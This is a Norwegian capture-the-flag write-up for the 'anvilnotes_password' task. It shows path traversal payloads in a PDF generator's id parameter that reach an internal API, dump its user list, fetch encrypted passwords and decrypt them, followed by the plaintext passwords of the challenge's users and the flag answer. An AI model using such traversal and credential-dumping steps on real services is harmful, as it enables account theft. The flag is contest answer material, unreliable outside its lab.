# 2.04_anvilnotes_password

Får nå logget inn som admin og kan kjøre genpdf kommandoen. Prøver å kjøre mange forskjellige id'er men finner ingenting. Prøver å google generatoren `WeasyPrint 56.1` men ingen av exploitsa der fungerer. Fant utav at jeg kunne kjøre `id=/1` så virker som det var noe path greier. Er notene hardfiler? 

Prøvde etter mye om og men og kanskje flere dager på omveier hvor jeg ikke så det åpenlyse. Fikk hint om å se mer på id'en og hev kjapt inn path traversal med tanke på at jeg husket at den godtok jo mer en nummer. Så `id=../../` fikk da opp swagger docs på en api server eller noe. Prøvde å kjøre noen av disse og fikk ut en liste me brukere på `../..//api/users`

```
[
	"admin", "admiN", "Benjamin", "Brian", "Cynthia", "Frank", "George", "Henry", "Jason", "Julia", "Karen",
	"Laura", "Marilyn", "Mark", "Mary", "Olivia", "oper", "Richard", "Russell", "Samuel", "Sharon",
	"Stephen", "test", "Theresa"
]
```

Kunne da kjøre og hente passordet dems med `../../api/user/Julia`

```
{
	"password": "99e921a104ff65171e8314f25f9807e20148ca0824b3d54f6864da7d85a083cdef01f1881d4ded47d66f21858f2b53330f59428cc377719da0e34150",
	"username": "Julia"
}
```

Så kunne jeg ta følgende for å få passordet i klartekst: `../../api/decrypt?data=PASSWORD`

```
gummy chevron rubdown pastel
```

Lagde da [anvilnotes_extract_passwords.js](anvilnotes_extract_passwords.js)

```
└─$ node anvilnotes_extract_passwords.js 
admin = FLAGG: 20c6cf2790e978f4afda631d24651732
admiN = admin
Benjamin = control unlatch conceal napped
Brian = stumble truce pantomime eaten
Cynthia = pulse aerospace multiple oppose
Frank = squeezing agreeably smashup darkish
George = monopoly handpick runner caress
Henry = esophagus proactive fragrant riverbank
Jason = cola oxidize spur famine
Julia = gummy chevron rubdown pastel
Karen = stumbling neon passport umpire
Laura = entourage setback simile sappy
Marilyn = chafe sitting docile synopses
Mark = fetal alias payment unbent
Mary = letter viselike freewill litigator
Olivia = untamed duty whiny improve
oper = FLAGG: 20c6cf2790e978f4afda631d24651732
Richard = subtly upward expose unmixed
Russell = vendor immature disbelief throwing
Samuel = perfected humorist enlighten constrict
Sharon = backlight luckiness sabotage virtuous
Stephen = perfume preachy everyday octane
test = test
Theresa = justify pranker stinging lard
```

Og der kom et flagg.

```
Kategori: 2. Oppdrag
Oppgave:  2.04_anvilnotes_password
Svar:     20c6cf2790e978f4afda631d24651732
Poeng:    10

Hvis aktøren har benyttet denne tjenesten finner vi kanskje noen interessante notater.
```